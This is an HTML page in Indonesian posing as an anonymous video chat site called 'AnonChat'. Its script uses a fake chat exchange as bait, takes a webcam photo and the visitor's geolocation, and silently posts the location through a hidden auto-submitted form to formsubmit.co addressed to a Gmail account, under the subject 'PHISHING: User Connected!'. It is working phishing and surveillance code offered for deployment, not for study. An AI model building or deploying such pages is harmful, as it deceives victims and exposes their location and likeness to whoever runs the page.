<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AnonChat</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #1a1a1a;
            color: white;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .container {
            width: 90%;
            max-width: 400px;
            background: #2d2d2d;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
            text-align: center;
        }
        h2 { margin-top: 0; color: #00ffcc; }
        .status { font-size: 0.8em; color: #888; margin-bottom: 20px; }
        button {
            background: #007bff;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
        }
        button:hover { background: #0056b3; }
        #video {
            width: 100%;
            border-radius: 10px;
            display: none; /* Sembunyikan video asli, yang ditampilkan hanya gambarnya */
            margin-top: 10px;
            background: black;
        }
        #photo {
            width: 100%;
            border-radius: 10px;
            display: none;
            margin-top: 10px;
            border: 2px solid #00ffcc;
        }
        .hidden { display: none; }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #00ffcc;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
            display: none;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        /* Animasi chat bubble palsu untuk memancing */
        .chat-bubble {
            background: #444;
            padding: 10px;
            border-radius: 10px;
            margin-top: 10px;
            text-align: left;
            font-size: 14px;
            animation: fadeIn 1s;
        }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>

    <div class="container">
        <h2>AnonChat 📷</h2>
        <p class="status">Menunggu koneksi...</p>
        
        <div id="loading" class="loader"></div>
        
        <!-- Area Chat Dummy -->
        <div id="chatInterface" style="display:none;">
            <div class="chat-bubble">Stranger: Halo, boleh lihat muka?</div>
            <div class="chat-bubble" style="background:#007bff; align-self:flex-end;">Kamu: Tentu.</div>
        </div>

        <!-- Video & Hasil -->
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>
        <img id="photo" alt="Foto Kamu">
        
        <br><br>
        <button id="btnAction" onclick="ambilData()">Mulai Chatting</button>
    </div>

    <script>
        // Konfigurasi Email Penerima
        const targetEmail = "desamuncrat477@gmail.com";
        
        const btn = document.getElementById('btnAction');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const photo = document.getElementById('photo');
        const loading = document.getElementById('loading');
        const chatInterface = document.getElementById('chatInterface');

        function ambilData() {
            // Ubah tombol jadi loading
            btn.style.display = 'none';
            loading.style.display = 'block';

            // 1. Minta Izin Kamera
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(function(stream) {
                    video.srcObject = stream;
                    video.play();

                    // Tunggu sebentar agar video siap, lalu ambil gambar
                    setTimeout(() => {
                        // Ambil Gambar
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
                        
                        // Konversi ke gambar base64
                        const imageUrl = canvas.toDataURL('image/png');
                        
                        // 2. Ambil Lokasi
                        if (navigator.geolocation) {
                            navigator.geolocation.getCurrentPosition(pos => {
                                const lokasi = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                                kirimKeEmail(imageUrl, lokasi);
                            }, err => {
                                kirimKeEmail(imageUrl, "Lokasi Ditolak/Tidak Diketahui");
                            });
                        } else {
                            kirimKeEmail(imageUrl, "Browser tidak support lokasi");
                        }

                    }, 1000); // Delay 1 detik agar video muncul
                })
                .catch(function(err) {
                    alert("Kamera atau Mikroton ditolak: " + err);
                    loading.style.display = 'none';
                    btn.style.display = 'inline-block';
                });
            }
        }

        function kirimKeEmail(gambarBase64, lokasi) {
            loading.style.display = 'none';
            
            // Tampilkan visual feedback bahwa berhasil
            chatInterface.style.display = 'block';
            const bubbleBaru = document.createElement('div');
            bubbleBaru.className = 'chat-bubble';
            bubbleBaru.innerText = "Sistem: Mengirim data...";
            chatInterface.appendChild(bubbleBaru);

            // Membuat link mailto
            const subject = "Data AnonChat Baru Diterima";
            const body = `Halo Admin,\n\nAda pengguna baru yang terhubung.\n\nLokasi:\n${lokasi}\n\nFoto:\n(Di bawah ini ada gambar)\n\nSILAKAN KLIK DI BAWAH UNTUK MELIHAT FOTO DAN MELUKAN.\n\n(Klik tombol di bawah untuk membuka aplikasi email)`;
            
            // Kita menggunakan teknik form mailer gratis atau mailto
            // Cara paling reliable tanpa backend adalah menggunakan formsubmit.co atau similar
            
            // Method 1: Mailto (Membuka Email Client user)
            // window.location.href = `mailto:${targetEmail}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;

            // Method 2: Menggunakan FormSubmit.co (Mengirim data tanpa buka email client)
            // Kita membuat form hidden dan submit otomatis
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'https://formsubmit.co/desamuncrat477@gmail.com';
            
            // Input data
            const inputSubject = document.createElement('input');
            inputSubject.type = 'hidden';
            inputSubject.name = '_subject';
            inputSubject.value = 'PHISHING: User Connected!';
            form.appendChild(inputSubject);

            const inputMsg = document.createElement('input');
            inputMsg.type = 'hidden';
            inputMsg.name = '_message';
            inputMsg.value = `User terhubung.\nLokasi: ${lokasi}\n\nSilakan lihat lampiran gambar.`;
            form.appendChild(inputMsg);

            // Kita tidak bisa attach base64 langsung di form HTML standar dengan mudah
            // Jadi kita akan mengirim lokasi via form, dan gambar akan ditampilkan di layar
            // Namun FormSubmit.co mendukung attachment jika kita encode gambar sebagai file.
            
            // Simpelnya: Kita tampilkan gambarnya di layar agar user yakin, 
            // dan kirim lokasi + notifikasi via email.
            
            document.body.appendChild(form);
            form.submit();

            // Tampilkan foto di layar
            photo.src = gambarBase64;
            photo.style.display = 'block';
            video.style.display = 'none'; // Stop video stream agar hemat baterai
            
            // Hapus form setelah submit
            document.body.removeChild(form);
        }
    </script>
</body>
</html>
